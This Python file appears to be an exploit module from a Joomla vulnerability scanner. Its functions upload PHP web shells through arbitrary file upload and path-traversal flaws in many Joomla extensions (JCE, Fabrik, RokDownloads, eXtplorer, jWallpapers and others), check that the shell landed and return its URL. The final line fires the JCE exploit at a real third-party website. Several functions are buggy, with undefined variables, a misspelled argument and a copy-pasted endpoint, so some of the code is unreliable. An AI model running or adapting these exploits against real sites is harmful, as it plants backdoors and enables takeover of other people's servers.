import os
import requests
import re
import curlify
def com_jce(url):
        headers = {}
        headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
        endpoint = url+"/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20"
        data = {
                'upload-dir':'./../../',
                'upload-overwrite':0,
                'Filedata' : [open('shell/VulnX.gif','rb')],
                'action':'Upload',
        }
        r = requests.post(endpoint, data=data, headers=headers,verify=False)
        print("curl : " ,curlify.to_curl(r.request))
        dump_data = url + "/VulnX.gif"
        res=requests.get(dump_data, headers)
        print("detect : " ,curlify.to_curl(res.request))
        matches = re.findall(re.compile(r'/image/gif/'),res.text)
        if matches:
            return dict(
                url=url,
                name="com_jce",
                status=True,
                shell=dump_data
            )
        else:
            return dict(
                url=url,
                name="com_jce",
                status=False
            )
def com_media(url):
        headers = {} 
        headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
        endpoint = url+"/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder="
        headers={"content-type":["form-data"]}
        fieldname = 'Filedata[]'
        shell = open('shell/VulnX.txt','rb')
        data = {
                fieldname:shell,
        }
        requests.post(endpoint, data=data, headers=headers,verify=False).text
        dump_data = endpoint+"/images/XAttacker.txt"
        response = requests.get(dump_data,headers,verify=False).text
        if re.findall(r'Tig', response):
            return dict(
                url=url,
                name="com_media",
                status=True,
                shell=dump_data
            )
        else:
            return dict(
                url=url,
                name="com_media",
                status=False
            )
def com_fabrika(url):
        headers = {} 
        headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
        endpoint = url+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
        headers={"content-type":["form-data"]}
        fieldname = 'file'
        shell = open('shell/VulnX.php','rb')
        data = {
                fieldname:shell,
        }
        requests.post(endpoint, data=data, headers=headers).text
        dump_data = endpoint+"/images/XAttacker.txt"
        response = requests.get(dump_data,headers,verify=False).text
        if re.findall(r'Vuln X', response):
            return dict(
                url=url,
                name="com_fabrika",
                status=True,
                shell=dump_data
            )
        else:
            return dict(
                url=url,
                name="com_fabrika",
                status=False
            )
def com_fabrikb(url):
        headers = {} 
        headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
        endpoint = url+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"


        headers={"content-type":["form-data"]}
        fieldname = 'file'
        shell = open('shell/VulnX.txt','rb')
        data = {
                fieldname:shell,
        }
        requests.post(endpoint, data=data, headers=headers,verify=False).text
        dump_data = endpoint+"/images/XAttacker.txt"
        response = requests.get(dump_data,headers,verify=False).text
        if re.findall(r'Tig', response):
            return dict(
                url=url,
                name="com_fabrik2",
                status=True,
                shell=dump_data
            )
        else:
            return dict(
                url=url,
                name="com_fabrik2",
                status=False
            )
def com_foxcontact(url):
        headers = {} 
        headers['User-Agent'] = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801'
    #    foxf = {'components/com_foxcontact/lib/file-uploader.php?cid={}&mid={}&qqfile=/../../_func.php',
    #            'index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id={}?cid={}&mid={}&qqfile=/../../_func.php',
    #            'index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id={}&cid={}&mid={}&owner=module&id={}&qqfile=/../../_func.php',
    #            'components/com_foxcontact/lib/uploader.php?cid={}&mid={}&qqfile=/../../_func.php'}
        endpoint = url+"/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"

        headers={"content-type":["form-data"]}
        fieldname = 'file'
        shell = open('shell/VulnX.txt','rb')
        data = {
                fieldname:shell,
        }
        requests.post(endpoint, data=data, headers=headers,verify=False).text
        dump_data = endpoint+"/images/XAttacker.txt"
        response = requests.get(dump_data,headers).text
        if re.findall(r'Tig', response):
            return dict(
                url=url,
                name="com_foxcontact",
                status=True,
                shell=dump_data
            )
        else:
            return dict(
                url=url,
                name="com_foxcontact",
                status=False
            )
def com_adsmanager(url):
        endpoint = url + "/index.php?option=com_adsmanager&task=upload&tmpl=component"
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.html')
        files= {'image': (name_img,img,'form-data',{'Expires': '0'}) }
        requests.post(endpoint,files=files ,headers=headers,verify=False)
        shellup = url + "/tmp/plupload/VulnX.html"
        checkShell = requests.get(shellup).text
        statusCheck = re.findall(re.compile(r'VulnX'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_adsmanager",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_adsmanager",
                status=False
            )
def com_blog(url):
        endpoint = url + "/index.php?option=com_myblog&task=ajaxupload"
        checkShell = requests.get(endpoint,headers=headers,verify=False).text
        statusCheck = re.findall(re.compile(r'has been uploaded'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_blog",
                status=True,
                shell=''
            )
        else:
            return dict(
                url=url,
                name="com_blog",
                status=False
            )
def com_users(url):
        endpoint = url + "/index.php?option=com_users&view=registration"
        checkShell = requests.get(endpoint,headers=headers,verify=False).text
        statusCheck = re.findall(re.compile(r'jform_email2-lbl'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_users",
                status=True,
                shell=''
            )
        else:
            return dict(
                url=url,
                name="com_users",
                status=False
            )
def comweblinks(url):
        endpoint = url + "/index.php?option=com_media&view=images&tmpl=component&e_name=jform_description&asset=com_weblinks&author="
        token = re.findall(re.compile(r'<form action=\"(.*?)" id="uploadForm\"'),endpoint)
        if token:
            url = token.group(1)
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.gif')
        fieldname = "image[]"
        files= {'image': (name_img,img,'form-data',{'Expires': '0'})}
        data = { fieldname : files }
        requests.post(endpoint, data=data, headers=headers,verify=False).text
        shellup = url + "/images/VulnX.gif"
        checkShell = requests.get(shellup)
        if checkShell.status_code == 200:
            return dict(
                url=url,
                name="comweblinks",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="comweblinks",
                status=False
            )
def mod_simplefileupload(url):
        endpoint = url + "/modules/mod_simplefileuploadv1.3/elements/udd.php"
        img = open('shell/VulnX.php.mp4', 'rb')
        name_img= os.path.basename('shell/VulnX.php.mp4')
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        requests.post(endpoint, files=files, headers=headers,verify=False)
        shellup = url + "/modules/mod_simplefileuploadv1.3/elements/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="mod_simplefileupload",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="mod_simplefileupload",
                status=False
            )
def com_jbcatalog(url):
        endpoint = url + "/components/com_jbcatalog/libraries/jsupload/server/php"
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.php')
        fieldname = "image[]"
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        data = { fieldname : files }
        requests.post(endpoint, data=data, headers=headers,verify=False).text
        shellup = url + "/components/com_jbcatalog/libraries/jsupload/server/php/files/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_jbcatalog",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_jbcatalog",
                status=False
            )
def com_sexycontactform(url):
        endpoint = url + "/com_sexycontactform/fileupload/index.php"
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.php')
        fieldname = "image[]"
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        data = { fieldname : files }
        requests.post(endpoint, data=data, heades=headers,verify=False).text
        shellup = url + "/com_sexycontactform/fileupload/files/files/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup,headers=headers,verify=False).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_sexycontactform",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_sexycontactform",
                status=False
            )
def com_rokdownloads(url):
        endpoint = url + "/administrator/components/com_rokdownloads/assets/uploadhandler.php"
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.php')
        fieldname = "Filedata"
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        data = { fieldname : files,
                'jpath' : '..%2F..%2F..%2F..%2F',
                }
        requests.post(endpoint, data=data, headers=headers,verify=False).text
        shellup = url + "/images/stories/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup,headers=headers,verify=False).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_rokdownloads",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_rokdownloads",
                status=False
            )
def com_extplorer(url):
        endpoint = url + "/administrator/components/com_extplorer/uploadhandler.php"
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.php')
        fieldname = "Filedata"
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        data = { fieldname : files }
        requests.post(endpoint, data, headers=headers,verify=False).text
        shellup = url + "/images/stories/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup,headers=headers,verify=False).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_extplorer",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_extplorer",
                status=False
            )
def com_jwallpapers(url):
        endpoint = url + "/index.php?option=com_jwallpapers&task=upload"
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.php')
        fieldname = "Filedata"
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        data = { fieldname : files ,
                'submit' : 'Upload',
                }
        requests.post(endpoint, data, headers=headers,verify=False).text
        shellup = url + "/jwallpapers_files/plupload/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup,headers=headers,verify=False).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_jwallpapers",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_jwallpapers",
                status=False
            )
def com_facileforms(url):
        endpoint = url + "/components/com_facileforms/libraries/jquery/uploadify.php"
        img = open('shell/VulnX.php', 'rb')
        name_img= os.path.basename('shell/VulnX.php')
        fieldname = "Filedata"
        files= {'image': (name_img,img,'multipart/form-data',{'Expires': '0'})}
        data = { fieldname : files ,
                'folder' : '/components/com_facileforms/libraries/jquery/',
                }
        requests.post(endpoint, data, headers=headers,verify=False).text
        shellup = url + "/components/com_facileforms/libraries/jquery/VulnX.php?Vuln=X"
        checkShell = requests.get(shellup,headers=headers,verify=False).text
        statusCheck = re.findall(re.compile(r'Vuln X'),checkShell)
        if statusCheck:
            return dict(
                url=url,
                name="com_facileforms",
                status=True,
                shell=shellup
            )
        else:
            return dict(
                url=url,
                name="com_facileforms",
                status=False
            )
print(com_jce('http://boumaghis.free.fr/'))